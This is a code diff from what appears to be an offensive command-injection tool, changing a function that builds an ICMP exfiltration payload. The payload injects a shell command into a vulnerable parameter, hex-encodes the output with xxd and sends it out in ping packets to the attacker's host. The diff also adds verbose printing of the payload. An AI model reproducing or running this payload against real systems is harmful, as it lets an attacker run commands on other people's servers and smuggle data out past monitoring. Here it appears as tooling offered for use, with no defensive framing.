@@ -86,7 +86,12 @@ def snif(ip_dst, ip_src):
  
 def cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src):
   # icmp exfiltration payload.
-  payload = ('; ' + cmd + ' | xxd -p -c8 | while read line; do ping -p $line -c 1 -s16 -q ' + ip_src + '; done')
+  payload = ("; " + cmd + " | xxd -p -c 16 | while read line; do ping -p $line -c 1 -s16 -q " + ip_src + "; done")
+  
+  # Check if defined "--verbose" option.
+  if menu.options.verbose:
+    sys.stdout.write("\n" + Fore.GREY + "(~) Payload: " + payload + Style.RESET_ALL)
+
   if http_request_method == "GET":
     url = url.replace(settings.INJECT_TAG, "")
     data = payload.replace(" ", "%20")
@@ -100,7 +105,8 @@ def cmd_exec(http_request_method, cmd, url, vuln_parameter, ip_src):
   response = urllib2.urlopen(req)
   time.sleep(2)
   sys.stdout.write("\n" + Style.RESET_ALL)
-
+  print ""
+  
 def input_cmd(http_request_method, url, vuln_parameter, ip_src, technique):
 
   err_msg = ""
